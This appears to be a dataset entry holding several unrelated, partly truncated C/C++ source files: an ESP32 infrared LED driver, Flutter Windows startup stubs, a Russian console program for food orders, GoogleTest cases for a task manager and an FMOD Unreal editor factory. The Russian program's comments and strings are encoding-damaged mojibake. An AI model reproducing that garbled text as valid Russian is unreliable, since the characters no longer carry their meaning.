    "#include \"InfraredLight.h\"\n\n#define pwmSpeedMode LEDC_LOW_SPEED_MODE\n\nInfraredLED::InfraredLED(uint8_t pin,ledc_timer_t timer, ledc_channel_t channel){\n    this->ledPin = pin;\n    this->timer = timer;\n    this->channel = channel;\n};\n\nvoid InfraredLED::begin(void){\n   //we want to change frequency instead of \n    pwmTimer = ledc_timer_config_t{\n        .speed_mode = pwmSpeedMode,\n        .duty_resolution = LEDC_TIMER_10_BIT,\n        .timer_num = this->timer,\n        .freq_hz = 800,\n        .clk_cfg = LEDC_AUTO_CLK\n    };\n    ledc_timer_config(&pwmTimer);\n\n    pwmChannel = ledc_channel_config_t{\n        .gpio_num = this->ledPin,\n        .speed_mode =pwmSpeedMode,\n        .channel = this->channel,\n        .intr_type = LEDC_INTR_DISABLE,\n        .timer_sel = this->timer,\n        .duty = 0,\n        .hpoint = 0\n    };\n    ledc_channel_config(&pwmChannel);\n};\n\nvoid InfraredLED::turnOn(void){\n    InfraredLED::setState(true);\n};\n\nvoid InfraredLED::turnOff(void){\n    InfraredLED::setState(false);\n};\n\nvoid InfraredLED::setState(bool state){\n    ledc_set_freq(pwmSpeedMode,timer,1);\n    if (state) {\n        ledc_set_duty(pwmSpeedMode,channel,1023);\n    } else {\n        ledc_set_duty(pwmSpeedMode,channel,0);\n    }\n    ledc_update_duty(pwmSpeedMode,channel);\n    \n};\n\nvoid InfraredLED::sendFrequency(uint16_t frequency){\n    ledc_set_freq(pwmSpeedMode,timer,frequency);\n    ledc_set_duty(pwmSpeedMode,channel,512);\n    ledc_update_duty(pwmSpeedMode,channel);\n};",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"todolist\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <cstdio>\n#include <cstdlib>\n#include <cstring>\n#include <clocale>\n\n#include <conio.h>\n\nusing namespace std;\nusing namespace System;\nusing namespace System::IO;\n\n// \u00d1\u00f2\u00f0\u00f3\u00ea\u00f2\u00f3\u00f0\u00e0 \u00ee\u00ef\u00e8\u00f1\u00fb\u00e2\u00e0\u00fe\u00f9\u00e0\u00ff \u00ee\u00e4\u00e8\u00ed \u00e7\u00e0\u00ea\u00e0\u00e7 \u00e5\u00e4\u00fb.\nstruct order\n{\n\tchar address[20];  // \u00c0\u00e4\u00f0\u00e5\u00f1 \u00e7\u00e0\u00ea\u00e0\u00e7\u00e0.\n\tchar kind[20];     // \u00d2\u00e8\u00ef \u00ef\u00f0\u00ee\u00e4\u00f3\u00ea\u00f2\u00e0.\n\tchar date[11];     // \u00c4\u00e0\u00f2\u00e0 \u00ef\u00ee\u00f1\u00f2\u00f3\u00ef\u00eb\u00e5\u00ed\u00e8\u00ff \u00e7\u00e0\u00ea\u00e0\u00e7\u00e0.\n\tlong weight;       // \u00c2\u00e5\u00f1 \u00e7\u00e0\u00ea\u00e0\u00e7\u00e0.\n\tlong price;        // \u00d6\u00e5\u00ed\u00e0 \u00e7\u00e0\u00ea\u00e0\u00e7\u00e0.\n};\n\n// \u00c4\u00e2\u00f3\u00f1\u00f2\u00ee\u00f0\u00ee\u00ed\u00ed\u00e8\u00e9 \u00f1\u00e2\u00ff\u00e7\u00ed\u00fb\u00e9 \u00f1\u00ef\u00e8\u00f1\u00ee\u00ea, \u00f5\u00f0\u00e0\u00ed\u00ff\u00f9\u00e8\u00e9 \n// \u00e4\u00e0\u00ed\u00ed\u00fb\u00e5 \u00ee \u00f1\u00f3\u00ec\u00ec\u00e0\u00f0\u00ed\u00ee\u00e9 \u00f6\u00e5\u00ed\u00e5 \u00e8 \u00ea\u00ee\u00eb-\u00e2\u00e5 \n// \u00e7\u00e0\u00ea\u00e0\u00e7\u00ee\u00e2 \u00ee\u00ef\u00f0\u00e5\u00e4\u00e5\u00eb\u00e5\u00ed\u00ed\u00ee\u00e3\u00ee \u00f2\u00e8\u00ef\u00e0.\nstruct list\n{\n\tchar kind[20];      // \u00d2\u00e8\u00ef \u00ef\u00f0\u00ee\u00e4\u00f3\u00ea\u00f2\u00e0\n\tlong count;         // \u00ca\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00e7\u00e0\u00ea\u00e0\u00e7\u00ee\u00e2 \u00f1 \u00ef\u00f0\u00ee\u00e4\u00f3\u00ea\u00f2\u00ee\u00ec.\n\tlong price;         // \u00d1\u00f3\u00ec\u00ec\u00e0\u00f0\u00ed\u00e0\u00ff \u00f6\u00e5\u00ed\u00e0 \u00e7\u00e0\u00ea\u00e0\u00e7\u00ee\u00e2.\n\tstruct list* next;  // \u00d1\u00eb\u00e5\u00e4\u00f3\u00fe\u00f9\u00e8\u00e9 \u00f3\u00e7\u00e5\u00eb \u00f1\u00ef\u00e8\u00f1\u00ea\u00e0.\n\tstruct list* prev;  // \u00cf\u00f0\u00e5\u00e4\u00fb\u00e4\u00f3\u00f9\u00e8\u00e9 \u00f3\u00e7\u00e5\u00eb \u00f1\u00ef\u00e8\u00f1\u00ea\u00e0\u00e7.\n};\n\n// \u00c4\u00e8\u00ed\u00e0\u00ec\u00e8\u00f7\u00e5\u00f1\u00ea\u00e8\u00e9 \u00ec\u00e0\u00f1\u00f1\u00e8\u00e2 \u00e4\u00e0\u00ed\u00ed\u00fb\u00f5 \u00f2\u00e8\u00ef\u00e0 struct order.\nstruct orders\n{\n\tunsigned int count;    // \u00ca\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00e7\u00e0\u00ea\u00e0\u00e7\u00ee\u00e2 \u00e5\u00e4\u00fb.\n\tstruct order* values;  // \u00cc\u00e0\u00f1\u00f1\u00e8\u00e2 \u00e7\u00e0\u00ea\u00e0\u00e7\u00ee\u00e2 \u00e5\u00e4\u00fb.\n};\n\n// \u00ce\u00ef\u00e8\u00f1\u00e0\u00ed\u00e8\u00e5:\n// \u00cf\u00e5\u00f7\u00e0\u00f2\u00e0\u00e5\u00f2 \u00e2 \u00ea\u00ee\u00ed\u00f1\u00ee\u00eb\u00fc (\u00ef\u00e5\u00f0\u00e5\u00ef\u00e8\u00f1\u00fb\u00e2\u00e0\u00e5\u00f2 \u00e2\u00e5\u00f1\u00fc \u00fd\u00ea\u00f0\u00e0\u00ed)\n// \u00e4\u00e0\u00ed\u00ed\u00fb\u00e5 \u00ec\u00e0\u00f1\u00f1\u00e8\u00e2\u00e0 orders.\nstatic void print_orders(struct orders orders)\n{\n\tConsole::ForegroundColor = ConsoleColor::White;\n\tConsole::BackgroundColor = ConsoleColor::Black;\n\tConsole::Clear();\n\tfor (unsigned int i = 0; i < orders.count; i++)\n\t{\n\t\tprintf(\n\t\t\t\"\\n%-20s %-20s %11s %7ld %7ld\",\n\t\t\torders.values[i].address,\n\t\t\torders.values[i].kind,\n\t\t\torders.values[i].date,\n\t\t\torders.values[i].weight,\n\t\t\torders.values[i].price\n\t\t);\n\t}\n\t(void)_getch();\n}\n\n// \u00ce\u00ef\u00e8\u00f1\u00e0\u00ed\u00e8\u00e5:\n// \u00cf\u00e5\u00f7\u00e0\u00f2\u00e0\u00e5\u00f2 \u00e2 \u00ea\u00ee\u00ed\u00f1\u00ee\u00eb\u00fc (\u00ef\u00ee\u00f1\u00eb\u00e5 \u00ea\u00f3\u00f0\u00f1\u00ee\u00f0\u00e0)\n// \u00e7\u00e0\u00ea\u00e0\u00e7 \u00f1 \u00ed\u00e0\u00e8\u00e1\u00ee\u00eb\u00fc\u00f8\u00e5\u00e9 \u00f6\u00e5\u00ed\u00ee\u00e9.\nstatic void print_most_expensive_order(struct orders orders)\n{\n\tstruct order* best = &orders.values[0];\n\tfor (unsigned int i = 1; i < orders.count; i++)\n\t{\n\t\tif (best->price < orders.values[i].price)\n\t\t{\n\t\t\tbest = &orders.values[i];\n\t\t}\n\t}\n\tConsole::ForegroundColor = ConsoleColor::Yellow;\n\tConsole::BackgroundColor = ConsoleColor::Black;\n\n\tConsole::CursorLeft = 10;\n\tprintf(\"\u00d1\u00e0\u00ec\u00fb\u00e9 \u00e4\u00ee\u00f0\u00ee\u00e3\u00ee\u00e9 \u00e7\u00e0\u00ea\u00e0\u00e7: %ld \u00f0\u00f3\u00e1.\\n\", best->price);\n\tConsole::CursorLeft = 10;\n\tprintf(\"\u00c5\u00e3\u00ee \u00e0\u00e4\u00f0\u00e5\u00f1: %s\\n\", best->address);\n\t(void)_getch();\n}\n\n// \u00ce\u00ef\u00e8\u00f1\u00e0\u00ed\u00e8\u00e5:\n// \u00cf\u00e5\u00f0\u00e5\u00e2\u00ee\u00e4\u00e8\u00f2 \u00e4\u00e0\u00f2\u00f3 \u00e8\u00e7 \u00f4\u00ee\u00f0\u00ec\u00e0\u00f2\u00e0 '\u00e3\u00e3\u00e3\u00e3_\u00ec\u00ec_\u00e4\u00e4' (from)\n// \u00e2 \u00f4\u00ee\u00f0\u00ec\u00e0\u00f2 '\u00e4\u00e4 \u00ec\u00e5\u00f1\u00ff\u00f6 \u00e3\u00e3\u00e3\u00e3' (to).\n// \n// \u00c5\u00f1\u00eb\u00e8 \u00f3\u00f7\u00e0\u00f1\u00f2\u00ea\u00e8 \u00ef\u00e0\u00ec\u00ff\u00f2\u00e8 to \u00e8 from \u00ef\u00e5\u00f0\u00e5\u00f1\u00e5\u00ea\u00e0\u00fe\u00f2\u00f1\u00ff, \n// \u00f2\u00ee \u00ef\u00ee\u00e2\u00e5\u00e4\u00e5\u00ed\u00e8\u00e5 \u00f4\u00f3\u00ed\u00ea\u00f6\u00e8\u00e8 \u00ed\u00e5\u00ee\u00ef\u00f0\u00e5\u00e4\u00e5\u00eb\u00e5\u00ed\u00ee.\n// \n// \u00c0\u00f0\u00e3\u00f3\u00ec\u00e5\u00ed\u00f2\u00fb:\n// to   -> \u00d3\u00ea\u00e0\u00e7\u00e0\u00f2\u00e5\u00eb\u00fc \u00ed\u00e0 \u00ec\u00e0\u00f1\u00f1\u00e8\u00e2 (24+ \u00f1\u00e8\u00ec\u00e2.), \n//         \u00e2 \u00ea\u00ee\u00f2\u00ee\u00f0\u00ee\u00ec \u00e1\u00f3\u00e4\u00e5\u00f2 \u00f1\u00ee\u00f5\u00f0\u00e0\u00ed\u00e5\u00ed\u00e0 \u00e4\u00e0\u00f2\u00e0 \u00e2 \n//         \u00e8\u00f2\u00ee\u00e3\u00ee\u00e2\u00ee\u00ec \u00f4\u00ee\u00f0\u00ec\u00e0\u00f2\u00e5 \u00ea\u00e0\u00ea \n//         \u00ed\u00f3\u00eb\u00fc-\u00f2\u00e5\u00f0\u00ec\u00e8\u00ed\u00e8\u00f0\u00ee\u00e2\u00e0\u00ed\u00ed\u00e0\u00ff \u00f1\u00f2\u00f0\u00ee\u00ea\u00e0.\n// from -> \u00d3\u00ea\u00e0\u00e7\u00e0\u00f2\u00e5\u00eb\u00fc \u00ed\u00e0 \u00ed\u00f3\u00eb\u00fc-\u00f2\u00e5\u00f0\u00ec\u00e8\u00ed\u00e8\u00f0\u00ee\u00e2\u00e0\u00ed\u00ed\u00f3\u00fe \n//         \u00f1\u00f2\u00f0\u00ee\u00ea\u00f3 (11 \u00f1\u00e8\u00ec\u00e2. \u00e2\u00ea\u00eb\u00fe\u00f7\u00e0\u00ff \u00ed\u00f3\u00eb\u00fc),\n//         \u00e2 \u00ea\u00ee\u00f2\u00ee\u00f0\u00ee\u00e9 \u00f1\u00ee\u00e4\u00e5\u00f0\u00e6\u00e8\u00f2\u00f1\u00ff \u00e4\u00e0\u00f2\u00e0 \u00e2 \n//         \u00e8\u00e7\u00ed\u00e0\u00f7\u00e0\u00eb\u00fc\u00ed\u00ee\u00ec \u00f4\u00ee\u00f0\u00ec\u00e0\u00f2\u00e5.\nstatic void to_pretty_date(char* to, const char* from)\n{\n\tchar tmp[3];\n\tconst char* months[] = {\n\t\t\"\u00ff\u00ed\u00e2\u00e0\u00f0\u00ff\",\"\u00f4\u00e5\u00e2\u00f0\u00e0\u00eb\u00ff\",\"\u00ec\u00e0\u00f0\u00f2\u00e0\",\"\u00e0\u00ef\u00f0\u00e5\u00eb\u00ff\",\"\u00ec\u00e0\u00ff\",\"\u00e8\u00fe\u00ed\u00ff\",\n\t\t\"\u00e8\u00fe\u00eb\u00ff\",\"\u00e0\u00e2\u00e3\u00f3\u00f1\u00f2\u00e0\",\"\u00f1\u00e5\u00ed\u00f2\u00ff\u00e1\u00f0\u00ff\",\"\u00ee\u00ea\u00f2\u00ff\u00e1\u00f0\u00ff\",\"\u00ed\u00ee\u00ff\u00e1\u00f0\u00ff\",\"\u00e4\u00e5\u00ea\u00e0\u00e1\u00f0\u00ff\"\n\t};\n\tstrcpy(to, from + 8);\n\tstrcat(to, \" \");\n\tstrncpy(tmp, from + 5, 2);\n\ttmp[2] = '\\0';\n\tstrcat(to, months[atoi(tmp) - 1]);\n\tstrcat(to, \" \");\n\tstrncat(to, from, 4);\n}\n\n// \u00ce\u00ef\u00e8\u00f1\u00e0\u00ed\u00e8\u00e5:\n// \u00cf\u00e5\u00f7\u00e0\u00f2\u00e0\u00e5\u00f2 \u00e2 \u00ea\u00ee\u00ed\u00f1\u00ee\u00eb\u00fc (\u00ef\u00ee\u00f1\u00eb\u00e5 \u00ea\u00f3\u00f0\u00f1\u00ee\u00f0\u00e0)\n// \u00e7\u00e0\u00ea\u00e0\u00e7 \u00f1 \u00f1\u00e0\u00ec\u00ee\u00e9 \u00ef\u00ee\u00e7\u00e4\u00ed\u00e5\u00e9 \u00e4\u00e0\u00f2\u00ee\u00e9.\n//\n// \u00c5\u00f1\u00eb\u00e8 \u00e7\u00e0\u00ea\u00e0\u00e7\u00ee\u00e2 \u00f1 \u00f2\u00e0\u00ea\u00ee\u00e9 \u00e4\u00e0\u00f2\u00ee\u00e9 \u00ed\u00e5\u00f1\u00ea\u00ee\u00eb\u00fc\u00ea\u00ee, \n// \u00f2\u00ee \u00ef\u00e5\u00f7\u00e0\u00f2\u00e0\u00e5\u00f2 \u00eb\u00fe\u00e1\u00ee\u00e9 \u00e8\u00e7 \u00ed\u00e8\u00f5.\nstatic void last_order(struct orders orders)\n{\n\tstruct order* best = &orders.values[0];\n\tfor (unsigned int i = 0; i < orders.count; i++)\n\t{\n\t\tif (strcmp(orders.values[i].date, best->date) < 0)\n\t\t{\n\t\t\tbest = &orders.values[i];\n\t\t}\n\t}\n\n\tchar pretty_date[17];\n\tto_pretty_date(pretty_date, best->date);\n\tConsole::ForegroundColor = ConsoleColor::Yellow;\n\tConsole::BackgroundColor = ConsoleColor::Black;\n\tConsole::CursorLeft = 10;\n\tprintf(\"\u00cf\u00ee\u00f1\u00eb\u00e5\u00e4\u00ed\u00e8\u00e9 \u00e7\u00e0\u00ea\u00e0\u00e7:\\n\");\n\tConsole::CursorLeft = 12;\n\tprintf(\"\u00ee\u00f2\u00ea\u00f0\u00fb\u00f2: %s\\n\", pretty_date);\n\tConsole::CursorLeft = 12;\n\tprintf(\"\u00e0\u00e4\u00f0\u00e5\u00f1: % s\\n\", best->address);\n\tConsole::CursorLeft = 12;\n\tprintf(\"\u00f2\u00e8\u00ef: %s\\n\", best->kind);\n\tConsole::CursorLeft = 12;\n\tprintf(\"\u00f1\u00f3\u00ec\u00ec\u00e0: %ld\\n\", best->price);\n\t(void)_getch();\n}\n\n// \u00ce\u00ef\u00e8\u00f1\u00e0\u00ed\u00e8\u00e5:\n// \u00cf\u00e5\u00f7\u00e0\u00f2\u00e0\u00e5\u00f2 \u00e2 \u00ea\u00ee\u00ed\u00f1\u00ee\u00eb\u00fc (\u00ef\u00ee\u00f1\u00eb\u00e5 \u00ea\u00f3\u00f0\u00f1\u00ee\u00f0\u00e0)\n// \u00ea\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00e7\u00e0\u00ea\u00e0\u00e7\u00ee\u00e2 \u00ef\u00e8\u00f6\u00f6\u00fb.\nstatic void print_pizza_order_count(struct orders orders)\n{\n\tunsigned int total = 0;\n\tfor (unsigned int i = 0; i < orders.count; i++)\n\t{\n\t\tif (strcmp(orders.values[i].kind, \"\u00ef\u00e8\u00f6\u00f6\u00e0\") == 0) total++;\n\t}\n\n\tConsole::ForegroundColor = ConsoleColor::Yellow;\n\tConsole::BackgroundColor = ConsoleColor::Black;\n\n\tConsole::CursorLeft = 10;\n\tprintf(\"\\n\u00ca\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00e7\u00e0\u00ea\u00e0\u00e7\u00ee\u00e2 \u00ef\u00e8\u00f6\u00f6\u00fb: %u\", total);\n\t(void)_getch();\n}\n\n// \u00ce\u00ef\u00e8\u00f1\u00e0\u00ed\u00e8\u00e5:\n// \u00c2\u00fb\u00e4\u00ea\u00eb\u00ff\u00e5\u00f2 \u00ef\u00e0\u00ec\u00ff\u00f2\u00fc \u00e8 \u00e7\u00e0\u00ef\u00e8\u00f1\u00fb\u00e2\u00e0\u00e5\u00f2 \u00ed\u00ee\u00e2\u00fb\u00e9 \u00f3\u00e7\u00e5\u00eb \u00f1\u00ef\u00e8\u00f1\u00ea\u00e0,\n// \u00f1 \u00ef\u00f3\u00f1\u00f2\u00fb\u00ec\u00e8 \u00f3\u00ea\u00e0\u00e7\u00e0\u00f2\u00e5\u00eb\u00ff\u00ec\u00e8 \u00ed\u00e0 \u00f1\u00eb\u00e5\u00e4\u00f3\u00fe\u00f9\u00e8\u00e9 \u00e8 \u00ef\u00f0\u00e5\u00e4\u00fb\u00e4\u00f3\u00f9\u00e8\u00e9\n// \u00f3\u00e7\u00eb\u00fb.\n//\n// \u00c0\u00f0\u00e3\u00f3\u00ec\u00e5\u00ed\u00f2\u00fb:\n// order -> \u00c5\u00e4\u00e8\u00ed\u00f1\u00f2\u00e2\u00e5\u00ed\u00ed\u00fb\u00e9 \u00e7\u00e0\u00ea\u00e0\u00e7 \u00ea\u00ee\u00f2\u00ee\u00f0\u00fb\u00e9 \u00e1\u00f3\u00e4\u00e5\u00f2\n//          \u00ee\u00ef\u00e8\u00f1\u00fb\u00e2\u00e0\u00f2\u00fc\u00f1\u00ff \u00f3\u00e7\u00eb\u00ee\u00ec.\n// \n// \u00c2\u00ee\u00e7\u00e2\u00f0\u00e0\u00f9\u00e0\u00e5\u00f2:\n// \u00cd\u00ee\u00e2\u00fb\u00e9 \u00f3\u00e7\u00e5\u00eb \u00f1\u00ef\u00e8\u00f1\u00ea\u00e0. \u00d7\u00f2\u00ee\u00e1\u00fb \u00ee\u00f1\u00e2\u00ee\u00e1\u00ee\u00e4\u00e8\u00f2\u00fc \u00ef\u00e0\u00ec\u00ff\u00f2\u00fc\n// \u00ec\u00ee\u00e6\u00ed\u00ee \u00e8\u00f1\u00ef\u00ee\u00eb\u00fc\u00e7\u00ee\u00e2\u00e0\u00f2\u00fc free().\nstatic struct list* create_list_node(struct order order)\n{\n\tstruct list* node = (struct list*)malloc(sizeof(struct list));\n\tif (!node) abort();\n\tstrcpy(node->kind, order.kind);\n\tnode->count = 1;\n\tnode->price = order.price;\n\tnode->next = NULL;\n\tnode->prev = NULL;\n\treturn node;\n}\n\n// \u00ce\u00ef\u00e8\u00f1\u00e0\u00ed\u00e8\u00e5:\n// \u00c4\u00ee\u00e1\u00e0\u00e2\u00eb\u00ff\u00e5\u00f2 \u00e7\u00e0\u00ea\u00e0\u00e7 \u00e2 \u00f1\u00ef\u00e8\u00f1\u00ee\u00ea sp \u00f1\u00ee\u00f0\u00f2\u00e8\u00f0\u00f3\u00ff \u00e5\u00e3\u00ee \u00ef\u00ee \u00f2\u00e8\u00ef\u00f3 \n// \u00e7\u00e0\u00ea",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"netflixui\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\r\n#include \"pch.h\"\r\n#include <gtest/gtest.h>\r\n#include \"Red_Black_Tree.h\"\r\n\r\nTEST(display, ID) {\r\n    taskManagementSystem taskSystem;\r\n    // auto assign unique IDs to each Assignee\r\n    //First name, Last Name, Address, DOB\r\n    taskSystem.addAssignee(\"Maham\", \"Khurram\", \"Dha phase 2\", \"25/11/2002\");  //This should get A001\r\n    taskSystem.addAssignee(\"Laraib\", \"Fatima\", \"Dha phase 2\", \"11/2/2002\"); // A002 and so on.\r\n    taskSystem.addAssignee(\"Nuzhat\", \"ul\", \"Askari 14\", \"1/1/2001\");\r\n\r\n    std::stringstream actualOutput;\r\n    taskSystem.displaybyID(actualOutput, \"A002\");\r\n\r\n    //The expected output\r\n    std::string expectedOutput = \"Name: Laraib Fatima, Address: Dha phase 2, DOB: 11/2/2002, Assignee ID: A002\\n\";\r\n\r\n    // Compare the actual output with the expected output\r\n    ASSERT_EQ(actualOutput.str(), expectedOutput);\r\n\r\n}\r\n\r\nTEST(display, name) {\r\n    taskManagementSystem taskSystem;\r\n    // auto assign unique IDs to each Assignee\r\n    taskSystem.addAssignee(\"Muhammad\", \"Ali\", \"I8\", \"2/11/2001\");  //This should get A001\r\n    taskSystem.addAssignee(\"Muhammad\", \"Shah\", \"Dha phase 1\", \"11/2/2002\"); // A002 and so on.\r\n    taskSystem.addAssignee(\"Muhammad\", \"Ali\", \"Askari 14\", \"1/1/2003\");\r\n\r\n    std::stringstream actualOutput;\r\n    taskSystem.displaybyname(actualOutput, \"Muhammad\", \"Ali\");\r\n\r\n    //The expected output\r\n    std::string expectedOutput =\r\n        \"Name: Muhammad Ali, Address: I8, DOB: 2/11/2001, Assignee ID: A001\\n\"\r\n        \"Name: Muhammad Ali, Address: Askari 14, DOB: 1/1/2003, Assignee ID: A003\\n\";\r\n\r\n    // Compare the actual output with the expected output\r\n    ASSERT_EQ(actualOutput.str(), expectedOutput);\r\n\r\n}\r\nTEST(display, notask) {\r\n    taskManagementSystem taskSystem;\r\n    // auto assign unique IDs to each Assignee\r\n    taskSystem.addAssignee(\"Muhammad\", \"Ali\", \"I8\", \"2/11/2001\");  //This should get A001\r\n    taskSystem.addAssignee(\"Muhammad\", \"Shah\", \"Dha phase 1\", \"11/2/2002\"); // A002 and so on.\r\n    taskSystem.addAssignee(\"Muhammad\", \"Ali\", \"Askari 14\", \"1/1/2003\");\r\n\r\n    taskSystem.addTask(102, \"Fix Bug in Module B\", 2, \"A002\");\r\n    taskSystem.addTask(103, \"Write Unit Tests\", 1, \"A003\");\r\n\r\n\r\n    std::stringstream actualOutput;\r\n    taskSystem.AssigneeWithNoTask(actualOutput);\r\n\r\n    //The expected output\r\n    std::string expectedOutput = \"Name: Muhammad Ali, Address: I8, DOB: 2/11/2001, Assignee ID: A001\\n\";\r\n\r\n    // Compare the actual output with the expected output\r\n    ASSERT_EQ(actualOutput.str(), expectedOutput);\r\n\r\n}\r\nTEST(display, shiftTask) {\r\n    taskManagementSystem taskSystem;\r\n    // auto assign unique IDs to each Assignee\r\n    taskSystem.addAssignee(\"Mehar\", \"Azam\", \"I6\", \"2/11/2003\");  //This should get A001\r\n    taskSystem.addAssignee(\"Muhammad\", \"Hashim\", \"Dha phase 5\", \"11/2/2002\"); // A002 and so on.\r\n    taskSystem.addAssignee(\"Hashir\", \"Ather\", \"Askari 4\", \"1/1/2003\");\r\n\r\n    taskSystem.addTask(102, \"Fix Bug in Module B\", 2, \"A002\");\r\n    taskSystem.addTask(103, \"Write Unit Tests\", 1, \"A003\");\r\n\r\n    taskSystem.ShiftTask(\"A002\", \"A003\"); //tasks of A002 will be shifted to A003 and A002 will be left with no tasks for the time being.\r\n    std::stringstream actualOutput1;\r\n    taskSystem.AssigneeWithNoTask(actualOutput1);\r\n\r\n    //The expected output\r\n    std::string expectedOutput1 =\r\n        \"Name: Mehar Azam, Address: I6, DOB: 2/11/2003, Assignee ID: A001\\n\"\r\n        \"Name: Muhammad Hashim, Address: Dha phase 5, DOB: 11/2/2002, Assignee ID: A002\\n\";\r\n\r\n    std::stringstream actualOutput2;\r\n    taskSystem.printTaskQueue(actualOutput2); //output should be displayed in order of highest to lowest priority\r\n\r\n    //The expected output\r\n    std::string expectedOutput2 =\r\n        \"Task ID: 103, Description: Write Unit Tests, Priority: 1, Assignee: Hashir (A003)\\n\"\r\n        \"Task ID: 102, Description: Fix Bug in Module B, Priority: 2, Assignee: Hashir (A003)\\n\"\r\n        ;\r\n\r\n    // Compare the actual output with the expected output\r\n    ASSERT_EQ(actualOutput1.str(), expectedOutput1);\r\n    ASSERT_EQ(actualOutput2.str(), expectedOutput2);\r\n\r\n}\r\n \r\n\r\nTEST(display, delete1) {\r\n    taskManagementSystem taskSystem;\r\n    // auto assign unique IDs to each Assignee\r\n    taskSystem.addAssignee(\"Muhammad\", \"Ali\", \"I8\", \"2/11/2001\");  //This should get A001\r\n    taskSystem.addAssignee(\"Muhammad\", \"Shah\", \"Dha phase 1\", \"11/2/2002\"); // A002 and so on.\r\n    taskSystem.addAssignee(\"Muhammad\", \"Ali\", \"Askari 14\", \"1/1/2003\");\r\n\r\n    taskSystem.addTask(102, \"Fix Bug in Module B\", 2, \"A002\");\r\n    taskSystem.addTask(103, \"Write Unit Tests\", 1, \"A003\");\r\n\r\n    taskSystem.DeleteAssignee(\"A001\");\r\n    std::stringstream actualOutput;\r\n    taskSystem.DisplayAssignee(actualOutput); //Dispay in order of IDs\r\n\r\n    //The expected output\r\n    std::string expectedOutput =\r\n        \"Name: Muhammad Shah, Address: Dha phase 1, DOB: 11/2/2002, Assignee ID: A002\\n\"\r\n        \"Name: Muhammad Ali, Address: Askari 14, DOB: 1/1/2003, Assignee ID: A003\\n\";\r\n\r\n    // Compare the actual out",
    "// Copyright (c), Firelight Technologies Pty, Ltd. 2012-2024.\n\n#include \"FMODAmbientSoundActorFactory.h\"\n#include \"FMODStudioEditorPrivatePCH.h\"\n#include \"FMODAmbientSound.h\"\n#include \"FMODEvent.h\"\n#include \"AssetRegistry/AssetData.h\"\n#include \"Editor/EditorEngine.h\"\n\nUFMODAmbientSoundActorFactory::UFMODAmbientSoundActorFactory(const FObjectInitializer &ObjectInitializer)\n    : Super(ObjectInitializer)\n{\n    DisplayName = NSLOCTEXT(\"FMOD\", \"FMODAmbientSoundDisplayName\", \"FMOD Ambient Sound\");\n    NewActorClass = AFMODAmbientSound::StaticClass();\n}\n\nbool UFMODAmbientSoundActorFactory::CanCreateActorFrom(const FAssetData &AssetData, FText &OutErrorMsg)\n{\n    //We allow creating AAmbientSounds without an existing sound asset\n    if (UActorFactory::CanCreateActorFrom(AssetData, OutErrorMsg))\n    {\n        return true;\n    }\n\n    if (AssetData.IsValid() && !AssetData.GetClass()->IsChildOf(UFMODEvent::StaticClass()))\n    {\n        OutErrorMsg = NSLOCTEXT(\"FMOD\", \"CanCreateActorFrom_NoFMODEventAsset\", \"A valid FMOD Event asset must be specified.\");\n        return false;\n    }\n\n    return true;\n}\n\nvoid UFMODAmbientSoundActorFactory::PostSpawnActor(UObject *Asset, AActor *NewActor)\n{\n    UFMODEvent *Event = Cast<UFMODEvent>(Asset);\n\n    if (Event != NULL)\n    {\n        AFMODAmbientSound *NewSound = CastChecked<AFMODAmbientSound>(NewActor);\n        FActorLabelUtilities::SetActorLabelUnique(NewSound, Event->GetName());\n        NewSound->AudioComponent->Event = Event;\n    }\n}\n\nUObject *UFMODAmbientSoundActorFactory::GetAssetFromActorInstance(AActor *Instance)\n{\n    check(Instance->IsA(NewActorClass));\n    AFMODAmbientSound *SoundActor = CastChecked<AFMODAmbientSound>(Instance);\n\n    check(SoundActor->AudioComponent);\n    return 